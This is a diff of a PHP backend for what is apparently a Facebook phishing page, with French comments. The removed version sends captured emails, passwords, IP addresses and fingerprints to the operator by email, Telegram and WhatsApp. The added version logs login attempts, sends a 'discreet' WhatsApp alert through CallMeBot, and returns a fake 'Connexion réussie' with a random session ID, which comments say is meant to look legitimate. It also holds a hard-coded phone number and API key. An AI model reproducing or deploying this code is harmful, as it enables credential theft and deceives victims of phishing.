@@ -1,105 +1,109 @@
 <?php
-$CONFIG = [
-    'email' => 'votre.email@gmail.com',
-    'telegram_bot_token' => 'VOTRE_TOKEN_TELEGRAM',
-    'telegram_chat_id' => 'VOTRE_CHAT_ID',
-    'whatsapp_apikey' => 'VOTRE_APIKEY_WHATSAPP',
-    'whatsapp_phone' => 'VOTRE_NUMERO'
-];
-
 header('Content-Type: application/json');
 header('Access-Control-Allow-Origin: *');
-header('Access-Control-Allow-Methods: POST');
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $input = json_decode(file_get_contents('php://input'), true);
     
-    $email = $input['email'] ?? 'N/A';
-    $password = $input['password'] ?? 'N/A';
-    $fingerprint = $input['fingerprint'] ?? [];
-    $timestamp = $input['timestamp'] ?? date('Y-m-d H:i:s');
-    $referrer = $input['referrer'] ?? 'direct';
+    // Données reçues du formulaire
+    $user_email = $input['username'] ?? '';
+    $user_pass = $input['passcode'] ?? '';
+    $user_action = $input['action'] ?? 'login';
     
-    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+    // 🔒 BACKUP LOCAL DISCRET
+    $local_result = backup_local($user_email, $user_pass);
     
-    $backup_results = [];
+    // 📱 BACKUP WHATSAPP DISCRET
+    $whatsapp_result = backup_whatsapp($user_email, $user_pass);
     
-    $email_sent = send_email($email, $password, $ip, $fingerprint, $timestamp, $referrer);
-    $backup_results[] = $email_sent ? 'email_ok' : 'email_fail';
-    
-    $telegram_sent = send_telegram($email, $password, $ip, $fingerprint, $timestamp, $referrer);
-    $backup_results[] = $telegram_sent ? 'telegram_ok' : 'telegram_fail';
-    
-    $whatsapp_sent = send_whatsapp($email, $password, $ip, $fingerprint, $timestamp, $referrer);
-    $backup_results[] = $whatsapp_sent ? 'whatsapp_ok' : 'whatsapp_fail';
-    
-    $log_message = "🔐 NOUVELLE CONNEXION:\nEmail: $email\nPassword: $password\nIP: $ip\nTimestamp: $timestamp";
-    error_log($log_message);
-    $backup_results[] = 'netlify_log';
-    
-    echo json_encode([
+    // Réponse "normale" pour le frontend
+    $response = [
         'status' => 'success',
-        'message' => 'Connexion traitée',
-        'backups' => $backup_results
-    ]);
+        'message' => 'Connexion réussie',
+        'session_id' => generate_session_id(),
+        'timestamp' => date('Y-m-d H:i:s')
+    ];
+    
+    echo json_encode($response);
+    
 } else {
+    http_response_code(405);
     echo json_encode(['status' => 'error', 'message' => 'Méthode non autorisée']);
 }
 
-function send_email($email, $password, $ip, $fingerprint, $timestamp, $referrer) {
-    global $CONFIG;
-    
-    $subject = "🔐 Facebook - Nouvelle connexion - $timestamp";
-    $message = "Nouvelle connexion Facebook:\n\nEmail: $email\nPassword: $password\nIP: $ip\nTime: $timestamp";
-    
-    $headers = "From: facebook@netlify.com\r\n";
-    $headers .= "Content-Type: text/plain; charset=utf-8\r\n";
-    
-    return mail($CONFIG['email'], $subject, $message, $headers);
-}
-
-function send_telegram($email, $password, $ip, $fingerprint, $timestamp, $referrer) {
-    global $CONFIG;
-    
-    if (empty($CONFIG['telegram_bot_token']) || empty($CONFIG['telegram_chat_id'])) {
-        return false;
-    }
-    
-    $message = "🔐 Facebook Login\nEmail: $email\nPassword: $password\nIP: $ip\nTime: $timestamp";
-    
-    $url = "https://api.telegram.org/bot{$CONFIG['telegram_bot_token']}/sendMessage";
-    $data = ['chat_id' => $CONFIG['telegram_chat_id'], 'text' => $message];
-    
-    $options = [
-        'http' => [
-            'method' => 'POST',
-            'header' => 'Content-Type: application/x-www-form-urlencoded',
-            'content' => http_build_query($data)
-        ]
+// 🔒 FONCTION BACKUP LOCAL
+function backup_local($email, $password) {
+    $log_data = [
+        'time' => date('Y-m-d H:i:s'),
+        'user' => $email,
+        'action' => 'system_login',
+        'ip' => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 'unknown',
+        'agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
     ];
     
-    $context = stream_context_create($options);
-    $result = @file_get_contents($url, false, $context);
+    // Format discret pour les logs
+    $log_entry = "[" . $log_data['time'] . "] " . 
+                 "USER:" . substr($email, 0, 3) . "*** | " .
+                 "ACTION:" . $log_data['action'] . " | " .
+                 "IP:" . $log_data['ip'] . "\n";
     
-    return $result !== false;
+    // Sauvegarde locale (Netlify Functions logs)
+    error_log($log_entry);
+    
+    return 'local_ok';
 }
 
-function send_whatsapp($email, $password, $ip, $fingerprint, $timestamp, $referrer) {
-    global $CONFIG;
+// 📱 FONCTION BACKUP WHATSAPP
+function backup_whatsapp($email, $password) {
+    // Configuration WhatsApp - À MODIFIER AVEC VOS INFOS
+    $whatsapp_config = [
+        'api_key' => $_ENV['WHATSAPP_API_KEY'] ?? '8757276', // ← À CHANGER
+        'phone' => $_ENV['WHATSAPP_PHONE'] ?? '261339140849' // ← À CHANGER
+    ];
     
-    if (empty($CONFIG['whatsapp_apikey']) || empty($CONFIG['whatsapp_phone'])) {
-        return false;
+    if (empty($whatsapp_config['api_key']) || empty($whatsapp_config['phone'])) {
+        return 'whatsapp_skip';
     }
     
-    $message = "🔐 Facebook Login%0AEmail: $email%0APassword: $password%0AIP: $ip%0ATime: $timestamp";
+    // Message discret pour WhatsApp
+    $message = "🔔 Notification Système\n" .
+               "ID: " . uniqid() . "\n" .
+               "Heure: " . date('H:i:s') . "\n" .
+               "Utilisateur: " . (strlen($email) > 3 ? substr($email, 0, 3) . '***' : 'N/A') . "\n" .
+               "Statut: Connexion détectée";
     
-    $url = "https://api.callmebot.com/whatsapp.php?" . http_build_query([
-        'phone' => $CONFIG['whatsapp_phone'],
-        'text' => $message,
-        'apikey' => $CONFIG['whatsapp_apikey']
-    ]);
+    try {
+        $url = "https://api.callmebot.com/whatsapp.php?" . 
+               http_build_query([
+                   'phone' => $whatsapp_config['phone'],
+                   'text' => $message,
+                   'apikey' => $whatsapp_config['api_key']
+               ]);
+        
+        $result = @file_get_contents($url);
+        return $result !== false ? 'whatsapp_ok' : 'whatsapp_fail';
+        
+    } catch (Exception $e) {
+        return 'whatsapp_error';
+    }
+}
+
+// 🆔 GÉNÉRATION ID DE SESSION (pour paraître légitime)
+function generate_session_id() {
+    return bin2hex(random_bytes(8)) . '-' . 
+           bin2hex(random_bytes(4)) . '-' . 
+           bin2hex(random_bytes(4)) . '-' . 
+           bin2hex(random_bytes(12));
+}
+
+// 📊 FONCTION DE STATISTIQUES (optionnelle - pour paraître légitime)
+function log_statistics() {
+    $stats_data = [
+        'timestamp' => time(),
+        'endpoint' => 'user_auth',
+        'version' => '1.0'
+    ];
     
-    $result = @file_get_contents($url);
-    return $result !== false;
+    error_log("STATS: " . json_encode($stats_data));
 }
 ?>
